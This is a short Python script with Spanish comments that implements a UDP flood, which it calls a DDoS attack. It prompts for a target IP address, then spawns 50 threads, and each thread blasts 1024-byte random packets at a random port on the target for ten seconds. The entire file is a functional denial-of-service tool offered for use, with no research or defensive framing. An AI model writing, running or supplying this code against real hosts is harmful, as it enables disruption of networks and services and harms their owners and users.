import socket
import threading
import time
import random

# Configuraciones del ataque
NUM_THREADS = 50  # Número de hilos para el ataque
PACKET_SIZE = 1024  # Tamaño de cada paquete en bytes
DURATION = 10  # Duración del ataque en segundos

def attack(target_ip, target_port):
    """Función que realiza el ataque DDoS a un objetivo específico."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = random._urandom(PACKET_SIZE)  # Generar un paquete aleatorio

    end_time = time.time() + DURATION
    while time.time() < end_time:
        sock.sendto(byte, (target_ip, target_port))
        print(f"Enviando paquete a {target_ip}:{target_port}")

    sock.close()
    print(f"Ataque a {target_ip}:{target_port} finalizado.")

def start_ddos_attack(target_ip):
    """Inicia múltiples hilos para llevar a cabo el ataque DDoS."""
    threads = []
    for _ in range(NUM_THREADS):
        target_port = random.randint(1, 65535)  # Seleccionar un puerto aleatorio
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()  # Espera a que todos los hilos terminen

if __name__ == '__main__':
    target_ip = input("Introduce la dirección IP del objetivo: ")
    start_ddos_attack(target_ip)
